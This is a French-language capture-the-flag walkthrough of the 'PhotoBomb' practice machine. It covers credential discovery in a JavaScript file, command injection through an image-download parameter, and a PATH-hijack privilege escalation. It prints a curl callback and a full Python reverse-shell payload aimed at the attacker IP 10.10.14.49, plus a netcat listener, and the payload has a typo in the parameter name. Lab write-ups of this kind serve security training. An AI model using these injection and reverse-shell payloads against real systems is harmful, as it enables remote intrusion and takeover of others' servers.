# PhotoBomb
## Description

>Sur cette machine, on a un server web où il y a un fichier JS ou nous trouvons les identifiants nous permettans d'accéder à un accès protégé.
Après nous abuserons le filetype parameter afin d'obtenir un reverse shell en tant que photobomb, pour la PE on utilisera une attaque path traverse afin d'obtenir les accès root.

## Reconnaissance (Nmap)

![](image/Nmap.jpg)

On a donc deux port ouverts:

1. 22 : ssh
2. 80 : http

Le port http nous redirige vers http://photobomb.htb/

Il faut donc l'ajouter au fichier

>/etc/hosts

## HTTP

On a accès à une simple page HTML avec un lien qui nous dirige vers /printer malheureusement un mot de passe que nous n'avons pas nous est demandé.

![](image/photobomb.jpg)

Après cette étape on remarque dans le source code du site un fichier javascript appelé 'photobomb.js'

![](image/photobomb.js.jpg)

A l'intérieur de ce fichier on obtient les identifiants nécessaire pour se connecter.

![](image/photobombInside.js.jpg)

>username = pH0t0
password = b0Mb!

On réussit à se connecter


![](image/Download%20Photo2Print.jpg)

On capture la requete avec burp et on essaie quelques injections dans les paramètres de la requete.

Avant tout il est nécessaire de démarrer son 'web server python'

>python3 -m http.server 80

## Command Injection

>photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg;curl+http%3a//10.10.14.49%3a80&dimensions=3000x2000

![](image/signal.jpg)

Touché, on peut donc avoir un reverse shell grâce à ça.

## RCE

Avant toute chose il est nécessaire de démarrer notre listener 

> nc -lvnp 443

Ensuite on injecte notre payload python

>photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetwhoype=jpg;python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.49%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)'&dimensions=3000x2000

![](image/BurpRevShell.jpg)

Bingo on a notre shell, nous somme identifié en tant que "wizard"

![](image/shell.jpg)

On obtient le fichier "user.txt"

![](image/user.jpg)

>user flag : a96f43b80ed9ad23aadd390256bf29d8

## Privilege Escalation

![](image/sudo_l.jpg)


Le contenue du script est plutôt simple, il faut prendre le fichier log et décplacer sont contenu dans le fichier "photobomb.log.old" puis utiliser truncate pour clear "photobomb.log"

On remarque que "clearly" n'utilise pas d'aabsolute path comme "cd", on va donc pouvoir utiliser ça à notre avantage et "traverser le path" du binaire.

![](image/cleanup.sh.jpg)

Ensuite il faut ajouter '/bin/bash' dans le fichier cd et lui donner les permissions "rwx"

On a juste a run ce fichier avec les permissions sudo et set le PATH au dossier /temp

![](image/addToPath.jpg)

![](image/Root%2Bflag.jpg)

>root flag : 66dc7af59106bd5a2466c16c59ce6677